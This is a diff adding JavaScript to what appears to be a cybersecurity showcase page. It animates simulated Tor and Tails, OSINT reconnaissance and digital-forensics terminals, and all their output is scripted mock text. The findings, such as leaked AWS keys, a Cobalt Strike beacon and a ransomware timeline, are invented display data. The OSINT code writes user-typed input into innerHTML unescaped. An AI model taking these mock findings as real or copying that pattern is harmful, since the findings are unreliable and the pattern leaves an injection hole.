+      const a=path[seg],b=path[seg+1];
+      const px=a.x+(b.x-a.x)*frac,py=a.y+(b.y-a.y)*frac;
+      // onion layers visualization
+      const layersLeft=path.length-1-seg;
+      for(let r=layersLeft;r>=1;r--){
+        ctx.beginPath();ctx.arc(px,py,r*4,0,Math.PI*2);
+        ctx.strokeStyle=`rgba(0,212,255,${.4/r})`;ctx.lineWidth=1;ctx.stroke();
+      }
+      ctx.beginPath();ctx.arc(px,py,5,0,Math.PI*2);ctx.fillStyle='#00d4ff';ctx.fill();
+    }
+    packetP+=.004;if(packetP>=1)packetP=0;
+    requestAnimationFrame(draw);
+  }
+  draw();
+}
+
+function torTab(tab,btn){
+  ['circuit','tails','comms'].forEach(t=>{const el=document.getElementById('tor-'+t);if(el)el.style.display='none';});
+  document.querySelectorAll('.tc-btn').forEach(b=>b.classList.remove('active'));
+  if(btn)btn.classList.add('active');
+  const el=document.getElementById('tor-'+tab);if(el)el.style.display='block';
+  if(tab==='tails')runTailsTerminal();
+  if(tab==='comms')runCommsViz();
+}
+
+function runTailsTerminal(){
+  const term=document.getElementById('tails-term');
+  if(!term||term.children.length>2)return;
+  const lines=[
+    {c:'t-success',t:'amnesia@tails:~$ '},
+    {c:'t-info',t:'Tails 6.0 (Amnesic Incognito Live System) — all traffic routed through Tor'},
+    {c:'t-success',t:'amnesia@tails:~$ systemctl status tor'},
+    {c:'t-out',t:'● tor.service - Anonymizing overlay network for TCP (multi-instance-master)'},
+    {c:'t-success',t:'     Active: active (running) since boot'},
+    {c:'t-success',t:'amnesia@tails:~$ curl https://check.torproject.org/api/ip'},
+    {c:'t-out',t:'{"IsTor":true,"IP":"45.33.32.156"}'},
+    {c:'t-success',t:'amnesia@tails:~$ gpg --gen-key'},
+    {c:'t-info',t:'gpg: key ED25519 generated: Marcus Benard <research@onion.tails>'},
+    {c:'t-success',t:'amnesia@tails:~$ echo "Sensitive data" | gpg --encrypt --armor -r research@onion.tails'},
+    {c:'t-warn',t:'-----BEGIN PGP MESSAGE-----'},
+    {c:'t-dim',t:'hQEMAzKFpbZxzLM5AQf/SpQ4Kf1C8F+0pWFgNv9TaL8z...'},
+    {c:'t-warn',t:'-----END PGP MESSAGE-----'},
+    {c:'t-success',t:'amnesia@tails:~$ # RAM-only OS — no traces left on disk after shutdown'},
+    {c:'t-info',t:'amnesia@tails:~$ # All evidence cleared on poweroff'},
+  ];
+  lines.forEach((l,i)=>setTimeout(()=>{
+    const d=document.createElement('div');d.className='t-line';
+    d.innerHTML=`<span class="${l.c}">${l.t}</span>`;term.appendChild(d);term.scrollTop=term.scrollHeight;
+  },i*300));
+}
+
+function runCommsViz(){
+  const flow=document.getElementById('comms-flow');
+  const layers=document.getElementById('onion-layers');
+  if(!flow)return;
+  flow.innerHTML=`
+<div style="display:flex;align-items:center;gap:.8rem;flex-wrap:wrap;font-family:var(--mono);font-size:.7rem;">
+  <div style="background:#000;border:1px solid #00ff88;padding:.8rem 1.2rem;text-align:center;">
+    <div style="color:#00ff88;font-size:.6rem;margin-bottom:.3rem;">SENDER</div>
+    <div style="font-size:1.2rem;">🧑‍💻</div>
+    <div style="color:var(--dim);font-size:.55rem;">Tails OS</div>
+  </div>
+  <div style="color:var(--dim);">→</div>
+  <div style="background:#000;border:1px solid #00d4ff;padding:.8rem 1.2rem;text-align:center;">
+    <div style="color:#00d4ff;font-size:.6rem;margin-bottom:.3rem;">AES-256</div>
+    <div style="font-size:1.2rem;">🔐</div>
+    <div style="color:var(--dim);font-size:.55rem;">Layer 3</div>
+  </div>
+  <div style="color:var(--dim);">→</div>
+  <div style="background:#000;border:1px solid #b060ff;padding:.8rem 1.2rem;text-align:center;">
+    <div style="color:#b060ff;font-size:.6rem;margin-bottom:.3rem;">TOR RELAY</div>
+    <div style="font-size:1.2rem;">🌐</div>
+    <div style="color:var(--dim);font-size:.55rem;">3 hops</div>
+  </div>
+  <div style="color:var(--dim);">→</div>
+  <div style="background:#000;border:1px solid #ff6b35;padding:.8rem 1.2rem;text-align:center;">
+    <div style="color:#ff6b35;font-size:.6rem;margin-bottom:.3rem;">EXIT NODE</div>
+    <div style="font-size:1.2rem;">🚪</div>
+    <div style="color:var(--dim);font-size:.55rem;">Decrypted</div>
+  </div>
+  <div style="color:var(--dim);">→</div>
+  <div style="background:#000;border:1px solid #00ff88;padding:.8rem 1.2rem;text-align:center;">
+    <div style="color:#00ff88;font-size:.6rem;margin-bottom:.3rem;">RECEIVER</div>
+    <div style="font-size:1.2rem;">🖥️</div>
+    <div style="color:var(--dim);font-size:.55rem;">Target</div>
+  </div>
+</div>`;
+  if(layers){
+    const onionLayers=[
+      {label:'Layer 3 — Guard Node Encryption',key:'AES-256 key: 7f4a2e...b3c9',color:'#00d4ff'},
+      {label:'Layer 2 — Middle Node Encryption',key:'AES-256 key: 9b1d4f...e7a2',color:'#b060ff'},
+      {label:'Layer 1 — Exit Node Encryption',key:'AES-256 key: 3c8f2b...4d6e',color:'#ff6b35'},
+      {label:'Core — Original Payload (HTTPS)',key:'TLS 1.3 + application data',color:'#00ff88'},
+    ];
+    layers.innerHTML=onionLayers.map(l=>`
+    <div style="background:#000;border:1px solid ${l.color}44;padding:.6rem 1rem;display:flex;justify-content:space-between;align-items:center;">
+      <span style="font-family:var(--mono);font-size:.65rem;color:${l.color};">${l.label}</span>
+      <span style="font-family:var(--mono);font-size:.6rem;color:var(--dim);">${l.key}</span>
+    </div>`).join('');
+  }
+}
+
+// ─── OSINT SIM ───────────────────────────────────────
+function buildOsintSim(){
+  return `
+<div style="margin-bottom:.8rem;">
+  <div style="display:flex;gap:.5rem;align-items:center;margin-bottom:1rem;">
+    <input id="osint-target" value="target-company.co.ke" style="flex:1;background:#000;border:1px solid var(--border);color:var(--c1);font-family:var(--mono);font-size:.7rem;padding:.5rem;outline:none;">
+    <button onclick="runOsintScan()" class="tc-btn" style="padding:.5rem 1rem;">▶ INVESTIGATE</button>
+  </div>
+  <div style="display:grid;grid-template-columns:1fr 1fr;gap:1rem;">
+    <div>
+      <div style="font-family:var(--mono);font-size:.65rem;color:var(--c2);margin-bottom:.5rem;">// INTELLIGENCE MAP</div>
+      <canvas id="osint-main-canvas" style="width:100%;height:300px;background:#000;border:1px solid var(--border);"></canvas>
+      <div id="osint-legend" style="display:flex;gap:.8rem;margin-top:.5rem;flex-wrap:wrap;"></div>
+    </div>
+    <div>
+      <div style="font-family:var(--mono);font-size:.65rem;color:var(--c2);margin-bottom:.5rem;">// FINDINGS</div>
+      <div class="terminal" id="osint-term" style="height:320px;"></div>
+    </div>
+  </div>
+</div>`;
+}
+
+function runOsintSim(){
+  const c=document.getElementById('osint-main-canvas');
+  if(!c)return;
+  const ctx=c.getContext('2d');
+  c.width=c.offsetWidth;c.height=300;
+  // Initial static map
+  const center={x:c.width/2,y:c.height/2};
+  ctx.fillStyle='#000';ctx.fillRect(0,0,c.width,c.height);
+  ctx.fillStyle='rgba(255,56,96,.2)';ctx.beginPath();ctx.arc(center.x,center.y,18,0,Math.PI*2);ctx.fill();
+  ctx.strokeStyle='#ff3860';ctx.lineWidth=2;ctx.stroke();
+  ctx.fillStyle='#ff3860';ctx.font='bold 8px Share Tech Mono';ctx.textAlign='center';ctx.fillText('TARGET',center.x,center.y+3);
+  ctx.fillStyle='rgba(0,212,255,.4)';ctx.font='7px Share Tech Mono';ctx.fillText('CLICK ▶ INVESTIGATE',center.x,center.y+30);
+}
+
+function runOsintScan(){
+  const target=document.getElementById('osint-target').value||'target.co.ke';
+  const term=document.getElementById('osint-term');
+  const c=document.getElementById('osint-main-canvas');
+  if(!term||!c)return;
+  term.innerHTML='';
+  const ctx=c.getContext('2d');
+  c.width=c.offsetWidth;c.height=300;
+  const center={x:c.width/2,y:c.height/2};
+  const findings=[
+    {label:'DNS A Record',color:'#00d4ff',data:`${target} → 197.155.64.42`,angle:0,dist:90,type:'dns'},
+    {label:'MX Server',color:'#00d4ff',data:'mail.google.com (GSuite)',angle:.6,dist:80},
+    {label:'Email: info@'+target,color:'#00ff88',data:'Found via Google Dorking',angle:1.2,dist:95,type:'email'},
+    {label:'Email: admin@'+target,color:'#00ff88',data:'Found via Linkedin OSINT',angle:1.8,dist:85,type:'email'},
+    {label:'LinkedIn Profile',color:'#b060ff',data:'CTO: John M. — 312 connections',angle:2.4,dist:90,type:'social'},
+    {label:'GitHub Leak',color:'#ff6b35',data:'AWS keys in commit 4af2b1',angle:3.0,dist:80,type:'leak'},
+    {label:'Shodan Result',color:'#ff3860',data:'OpenSSH 7.2p2 — vuln CVE-2016-6515',angle:3.6,dist:95,type:'shodan'},
+    {label:'WHOIS',color:'#00d4ff',data:'Registrar: KENIC — Expires 2025',angle:4.2,dist:85,type:'whois'},
+    {label:'SSL Cert',color:'#00ff88',data:'Let\'s Encrypt — SANs: 3 domains',angle:4.8,dist:90,type:'ssl'},
+    {label:'Tech Stack',color:'#b060ff',data:'WordPress 5.9.2, PHP 7.4 (EOL!)',angle:5.4,dist:82,type:'tech'},
+  ];
+  function tl(html,delay){setTimeout(()=>{const d=document.createElement('div');d.className='t-line';d.innerHTML=html;term.appendChild(d);term.scrollTop=term.scrollHeight;},delay);}
+  tl(`<span class="t-info">[OSINT] Starting reconnaissance on: ${target}</span>`,0);
+  tl('<span class="t-out">[*] Module: DNS enumeration...</span>',300);
+  let delay=500;
+  findings.forEach((f,i)=>{
+    tl(`<span class="t-success">[+] ${f.label}: </span><span class="t-out">${f.data}</span>`,delay);
+    delay+=600;
+    setTimeout(()=>{
+      const x=center.x+Math.cos(f.angle)*f.dist,y=center.y+Math.sin(f.angle)*f.dist*.65;
+      // draw connection
+      ctx.beginPath();ctx.moveTo(center.x,center.y);ctx.lineTo(x,y);
+      ctx.strokeStyle=f.color+'33';ctx.lineWidth=1;ctx.stroke();
+      // node
+      ctx.beginPath();ctx.arc(x,y,6,0,Math.PI*2);ctx.fillStyle=f.color+'22';ctx.fill();
+      ctx.strokeStyle=f.color;ctx.lineWidth=1.5;ctx.stroke();
+      ctx.fillStyle=f.color;ctx.font='6px Share Tech Mono';ctx.textAlign='center';ctx.fillText(f.label,x,y-10);
+      // center
+      ctx.beginPath();ctx.arc(center.x,center.y,14,0,Math.PI*2);
+      ctx.fillStyle='rgba(255,56,96,.15)';ctx.fill();ctx.strokeStyle='#ff3860';ctx.lineWidth=2;ctx.stroke();
+      ctx.fillStyle='#ff3860';ctx.font='bold 7px Share Tech Mono';ctx.textAlign='center';ctx.fillText('TARGET',center.x,center.y+3);
+    },delay-200);
+  });
+  tl(`<span class="t-err">[!] CRITICAL: Exposed AWS keys in GitHub — immediate remediation required!</span>`,delay);
+  tl(`<span class="t-warn">[!] HIGH: PHP 7.4 EOL — no security patches since Dec 2022</span>`,delay+400);
+  tl(`<span class="t-warn">[!] HIGH: OpenSSH CVE-2016-6515 — DoS vulnerability</span>`,delay+800);
+  tl(`<span class="t-success">[✓] OSINT complete — 10 intelligence nodes mapped</span>`,delay+1200);
+}
+
+// ─── FORENSICS SIM ───────────────────────────────────
+function buildForensicsSim(){
+  return `
+<div style="display:flex;gap:.5rem;margin-bottom:1rem;flex-wrap:wrap;">
+  <button class="tc-btn active" onclick="fTab('disk',this)">DISK ANALYSIS</button>
+  <button class="tc-btn" onclick="fTab('memory',this)">MEMORY DUMP</button>
+  <button class="tc-btn" onclick="fTab('timeline',this)">EVENT TIMELINE</button>
+  <button class="tc-btn" onclick="fTab('recovery',this)">FILE RECOVERY</button>
+</div>
+<div id="f-disk">
+  <div style="font-family:var(--mono);font-size:.65rem;color:var(--c2);margin-bottom:.8rem;">// DISK FORENSICS — SECTOR ANALYSIS</div>
+  <div style="display:grid;grid-template-columns:1fr 1fr;gap:1rem;">
+    <div>
+      <canvas id="disk-canvas" style="width:100%;height:200px;background:#000;border:1px solid var(--border);"></canvas>
+      <button onclick="runDiskScan()" class="tc-btn" style="width:100%;margin-top:.5rem;">▶ ANALYZE DISK IMAGE</button>
+    </div>
+    <div class="terminal" id="disk-term" style="height:250px;"></div>
+  </div>
+</div>
+<div id="f-memory" style="display:none;">
+  <div style="font-family:var(--mono);font-size:.65rem;color:var(--c2);margin-bottom:.5rem;">// MEMORY DUMP ANALYSIS — VOLATILITY</div>
+  <div class="terminal" id="mem-term" style="height:380px;"></div>
+  <button onclick="runMemAnalysis()" class="tc-btn" style="margin-top:.5rem;">▶ ANALYZE MEMORY DUMP</button>
+</div>
+<div id="f-timeline" style="display:none;">
+  <div style="font-family:var(--mono);font-size:.65rem;color:var(--c2);margin-bottom:.8rem;">// INCIDENT TIMELINE RECONSTRUCTION</div>
+  <div id="timeline-viz" style="display:flex;flex-direction:column;gap:.3rem;max-height:380px;overflow-y:auto;"></div>
+</div>
+<div id="f-recovery" style="display:none;">
+  <div style="font-family:var(--mono);font-size:.65rem;color:var(--c2);margin-bottom:.8rem;">// FILE CARVING — TESTDISK / PHOTOREC</div>
+  <div class="terminal" id="recovery-term" style="height:380px;"></div>
+  <button onclick="runFileRecovery()" class="tc-btn" style="margin-top:.5rem;">▶ START FILE CARVING</button>
+</div>`;
+}
+
+function runForensicsSim(){
+  drawDiskViz();
+  buildTimeline();
+}
+
+function fTab(tab,btn){
+  ['disk','memory','timeline','recovery'].forEach(t=>{const el=document.getElementById('f-'+t);if(el)el.style.display='none';});
+  document.querySelectorAll('.tc-btn').forEach(b=>b.classList.remove('active'));
+  if(btn)btn.classList.add('active');
+  const el=document.getElementById('f-'+tab);if(el)el.style.display='block';
+  if(tab==='memory')runMemAnalysis();
+}
+
+function drawDiskViz(){
+  const c=document.getElementById('disk-canvas');
+  if(!c)return;
+  const ctx=c.getContext('2d');
+  c.width=c.offsetWidth;c.height=200;
+  const sectors=64,rows=8,cols=sectors/rows;
+  const sw=c.width/cols,sh=c.height/rows;
+  const types=['normal','normal','normal','deleted','corrupted','normal','evidence'];
+  const colors={'normal':'#0e2a3a','deleted':'#ff3860','corrupted':'#ff6b35','evidence':'#00d4ff','free':'#041015'};
+  const grid=Array.from({length:sectors},()=>types[Math.floor(Math.random()*types.length)]);
+  grid[12]='evidence';grid[28]='evidence';grid[45]='deleted';grid[33]='corrupted';
+  function draw(){
+    ctx.fillStyle='#000';ctx.fillRect(0,0,c.width,c.height);
+    grid.forEach((t,i)=>{
+      const row=Math.floor(i/cols),col=i%cols;
+      const x=col*sw+1,y=row*sh+1,w=sw-2,h=sh-2;
+      ctx.fillStyle=colors[t]||'#041015';ctx.fillRect(x,y,w,h);
+      if(t==='evidence'||t==='deleted'){
+        ctx.strokeStyle=t==='evidence'?'#00d4ff':'#ff3860';ctx.lineWidth=1;ctx.strokeRect(x,y,w,h);
+      }
+    });
+  }
+  draw();
+  const legend=document.getElementById('disk-canvas');
+  if(legend&&legend.parentElement){
+    const leg=document.createElement('div');
+    leg.style.cssText='display:flex;gap:.8rem;margin-top:.4rem;flex-wrap:wrap;';
+    leg.innerHTML=[['normal','#0e2a3a','Normal'],['deleted','#ff3860','Deleted'],['corrupted','#ff6b35','Corrupted'],['evidence','#00d4ff','Evidence']]
+      .map(([_,c2,l])=>`<div style="display:flex;align-items:center;gap:.3rem;font-family:var(--mono);font-size:.55rem;color:var(--dim);"><div style="width:8px;height:8px;background:${c2};"></div>${l}</div>`).join('');
+    if(!legend.parentElement.querySelector('.disk-legend'))leg.className='disk-legend',legend.parentElement.appendChild(leg);
+  }
+}
+
+function runDiskScan(){
+  const term=document.getElementById('disk-term');
+  if(!term)return;term.innerHTML='';
+  function tl(html,d){setTimeout(()=>{const div=document.createElement('div');div.className='t-line';div.innerHTML=html;term.appendChild(div);term.scrollTop=term.scrollHeight;},d);}
+  tl('<span class="t-info">[*] TestDisk 7.2 — Disk analysis</span>',0);
+  tl('<span class="t-out">[*] Analyzing: /dev/sdb (500GB disk image)</span>',300);
+  tl('<span class="t-success">[+] Partition table: GPT detected</span>',700);
+  tl('<span class="t-out">[*] Sector size: 512 bytes</span>',1000);
+  tl('<span class="t-warn">[!] Deleted partition found at sector 2048</span>',1500);
+  tl('<span class="t-err">[!] 3 corrupted sectors: 28672, 38912, 45056</span>',2000);
+  tl('<span class="t-err">[EVIDENCE] Suspicious file signatures at sectors 12288, 14336</span>',2600);
+  tl('<span class="t-out">[*] File carving sectors 12288–14336...</span>',3200);
+  tl('<span class="t-success">[+] Recovered: document_final.docx (47KB)</span>',4000);
+  tl('<span class="t-success">[+] Recovered: credentials_backup.txt (2KB)</span>',4400);
+  tl('<span class="t-err">[!] credentials_backup.txt contains plaintext passwords!</span>',5000);
+  tl('<span class="t-success">[✓] Evidence preserved — MD5: 3d4f9a2e7b1c8f5d</span>',5800);
+}
+
+function runMemAnalysis(){
+  const term=document.getElementById('mem-term');
+  if(!term||term.children.length>2)return;
+  const lines=[
+    {c:'t-info',t:'[*] Volatility 3 — Memory Analysis Framework'},
+    {c:'t-out',t:'[*] Profile: WinXPSP3x86 — Image: memdump.raw (2GB)'},
+    {c:'t-success',t:'[+] Image verified — SHA256: 7a3f2b...'},
+    {c:'t-out',t:'[*] Running pstree plugin...'},
+    {c:'t-out',t:'  PID  PPID  Name                   Offset'},
+    {c:'t-out',t:'  4    0     System                 0x823c8830'},
+    {c:'t-out',t:'  620  4     smss.exe               0x82274020'},
+    {c:'t-err',t:'  1337 1234  malware.exe            0x824a3d20  ← SUSPICIOUS'},
+    {c:'t-out',t:'  1500 620   cmd.exe                0x82514568'},
+    {c:'t-warn',t:'[!] Suspicious process: malware.exe (PID 1337)'},
+    {c:'t-out',t:'[*] Dumping process memory for PID 1337...'},
+    {c:'t-success',t:'[+] Strings extracted: C2 server: 185.234.x.x:4444'},
+    {c:'t-err',t:'[!] MALWARE IDENTIFIED: Cobalt Strike Beacon'},
+    {c:'t-success',t:'[+] IOC documented — persistence via registry Run key'},
+    {c:'t-success',t:'[+] Report generated: forensics_report_001.pdf'},
+  ];
+  lines.forEach((l,i)=>setTimeout(()=>{
+    const d=document.createElement('div');d.className='t-line';
+    d.innerHTML=`<span class="${l.c}">${l.t}</span>`;term.appendChild(d);term.scrollTop=term.scrollHeight;
+  },i*500));
+}
+
+function buildTimeline(){
+  const container=document.getElementById('timeline-viz');
+  if(!container||container.children.length>0)return;
+  const events=[
+    {time:'2024-01-15 08:23:11',type:'NORMAL',color:'#3d7a99',msg:'User login: john.smith from 192.168.1.25'},
+    {time:'2024-01-15 08:45:33',type:'NORMAL',color:'#3d7a99',msg:'File access: /docs/Q4_report.xlsx'},
+    {time:'2024-01-15 09:12:07',type:'ANOMALY',color:'#ff6b35',msg:'Unusual time: Admin login from external IP 103.45.x.x'},
+    {time:'2024-01-15 09:14:22',type:'ALERT',color:'#ff3860',msg:'Privilege escalation: john.smith → root'},
+    {time:'2024-01-15 09:15:01',type:'ALERT',color:'#ff3860',msg:'Mass file access: 4,500 files in 43 seconds'},
+    {time:'2024-01-15 09:16:30',type:'CRITICAL',color:'#ff3860',msg:'Data exfiltration: 2.4GB upload to external IP'},
+    {time:'2024-01-15 09:18:00',type:'ALERT',color:'#ff3860',msg:'Ransomware: File rename pattern *.ENCRYPTED detected'},
+    {time:'2024-01-15 09:19:45',type:'CRITICAL',color:'#ff3860',msg:'Ransomware note dropped: HOW_TO_DECRYPT.txt'},
+    {time:'2024-01-15 09:23:11',type:'RESPONSE',color:'#00ff88',msg:'Wazuh automated block: 103.45.x.x blacklisted'},
+    {time:'2024-01-15 09:24:00',type:'RESPONSE',color:'#00ff88',msg:'n8n SOAR: Incident ticket #INC-2024-001 created'},
+    {time:'2024-01-15 09:25:30',type:'NORMAL',color:'#00d4ff',msg:'SOC analyst: Incident investigation started'},
+  ];
+  events.forEach(e=>{
+    const div=document.createElement('div');
+    div.style.cssText=`display:flex;gap:.8rem;align-items:flex-start;padding:.4rem;border-left:2px solid ${e.color};padding-left:.8rem;`;
+    div.innerHTML=`
+    <span style="font-family:var(--mono);font-size:.6rem;color:var(--dim);min-width:140px;">${e.time}</span>
+    <span style="font-family:var(--mono);font-size:.55rem;border:1px solid ${e.color};color:${e.color};padding:.1rem .4rem;min-width:70px;text-align:center;">${e.type}</span>
+    <span style="font-family:var(--mono);font-size:.65rem;color:var(--text);">${e.msg}</span>`;
+    container.appendChild(div);
+  });
+}
+
+function runFileRecovery(){
+  const term=document.getElementById('recovery-term');
+  if(!term)return;term.innerHTML='';
+  function tl(html,d){setTimeout(()=>{const div=document.createElement('div');div.className='t-line';div.innerHTML=html;term.appendChild(div);term.scrollTop=term.scrollHeight;},d);}
+  const files=[
+    {name:'deleted_contract.pdf',size:'234KB',type:'PDF',status:'RECOVERED'},
+    {name:'password_store.kdbx',size:'12KB',type:'KeePass DB',status:'RECOVERED'},
+    {name:'phishing_email.eml',size:'8KB',type:'Email',status:'RECOVERED'},
+    {name:'malware_dropper.exe',size:'456KB',type:'PE32 Executable',status:'RECOVERED'},
+    {name:'chat_logs.db',size:'1.2MB',type:'SQLite DB',status:'PARTIAL'},
+    {name:'crypto_wallet.dat',size:'78KB',type:'Bitcoin Wallet',status:'RECOVERED'},
+    {name:'image_0001.jpg',size:'3.4MB',type:'JPEG',status:'RECOVERED'},
+  ];
+  tl('<span class="t-info">[*] PhotoRec 7.2 — File Carving Tool</span>',0);
+  tl('<span class="t-out">[*] Source: /dev/sdb — all partitions</span>',300);
+  tl('<span class="t-out">[*] File systems: NTFS, FAT32, EXT4</span>',600);
+  tl('<span class="t-warn">[!] 156,432 sectors to analyze...</span>',900);
+  let d=1400;
+  files.forEach(f=>{
+    const col=f.status==='RECOVERED'?'t-success':'t-warn';
+    tl(`<span class="${col}">[${f.status}] ${f.name.padEnd(35)} ${f.size.padEnd(10)} ${f.type}</span>`,d);
+    d+=700;
+    if(f.name.includes('malware'))tl(`<span class="t-err">  → VirusTotal: 67/72 engines detected MALWARE</span>`,d);
+    if(f.name.includes('phishing'))tl(`<span class="t-warn">  → Sender: attacker@fake-bank.com | C2: 185.234.x.x</span>`,d+200);
+    d+=200;
+  });
+  tl('<span class="t-success">[✓] Recovery complete: 7 files carved, 6 fully recovered</span>',d+400);
+  tl('<span class="t-info">[*] All evidence hashed and preserved for chain of custody</span>',d+800);
+}
+
+// ============================================================
+// MODAL — cleanup intervals on close
+// ============================================================
+const origClose=window.closeSim;
+window.closeSim=function(){
+  socIntervals.forEach(i=>{try{clearInterval(i);clearTimeout(i);}catch(e){}});
+  socIntervals=[];
+  origClose();
+};
+</script>
+</body>
+</html>
